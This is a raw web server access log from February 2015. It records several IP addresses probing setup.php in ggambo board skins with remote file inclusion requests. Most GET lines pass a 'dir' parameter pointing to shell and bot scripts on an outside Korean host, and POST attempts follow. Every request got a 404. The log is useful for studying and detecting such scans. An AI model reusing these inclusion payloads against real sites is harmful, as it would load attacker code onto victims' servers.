176.31.252.38 - - [10/Feb/2015:13:43:15 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0" 
176.31.252.38 - - [10/Feb/2015:13:43:16 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0" 
176.31.252.38 - - [10/Feb/2015:13:43:16 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0" 
95.168.199.227 - - [10/Feb/2015:13:43:17 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
176.31.252.38 - - [10/Feb/2015:13:43:18 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0" 
95.168.199.227 - - [10/Feb/2015:13:43:18 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
95.168.199.227 - - [10/Feb/2015:13:43:18 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
95.168.199.227 - - [10/Feb/2015:13:43:19 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
176.31.252.38 - - [10/Feb/2015:13:43:20 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0" 
176.31.252.38 - - [10/Feb/2015:13:43:21 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0" 
176.31.252.38 - - [10/Feb/2015:13:43:21 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0" 
176.31.252.38 - - [10/Feb/2015:13:43:22 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0" 
95.168.199.227 - - [10/Feb/2015:13:43:22 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
95.168.199.227 - - [10/Feb/2015:13:43:24 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
95.168.199.227 - - [10/Feb/2015:13:43:24 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
95.168.199.227 - - [10/Feb/2015:13:43:25 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
49.50.76.8 - - [10/Feb/2015:13:43:40 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
49.50.76.8 - - [10/Feb/2015:13:43:42 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
49.50.76.8 - - [10/Feb/2015:13:43:43 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
49.50.76.8 - - [10/Feb/2015:13:43:44 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
112.218.68.155 - - [10/Feb/2015:13:43:50 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
